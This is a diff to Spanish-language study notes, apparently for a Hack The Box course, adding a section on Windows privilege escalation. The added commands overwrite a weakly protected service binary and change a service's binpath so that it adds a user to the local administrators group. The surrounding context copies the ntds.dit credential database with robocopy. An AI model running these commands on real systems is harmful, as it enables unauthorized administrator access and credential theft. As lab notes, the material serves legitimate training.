@@ -193,3 +193,18 @@ The operation completed successfully.
 ### Usando robocopy para copiar archivos
 - Robocopy es un programa de Windows que nos permite copiar archivos de manera recursiva.
 - `C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit`
+
+## Abusar de servicios con permisos debiles mediante su binary path
+- Muchas veces los servicios corren con permisos debiles y podemos abusar de esto cambiando el path de su binario.
+- Para enumearar podemos utilizar SharpUp.
+- `PS C:\htb> .\SharpUp.exe audit`
+### Reemplazando el binario de un servicio
+```
+C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+C:\htb> sc start SecurityService
+```
+### Cambiando el binario de un servicio
+- `C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators USER /add"`
+- `sc stop WindscribeService`
+- `sc start WindscribeService`
+- `net localgroup administrators`
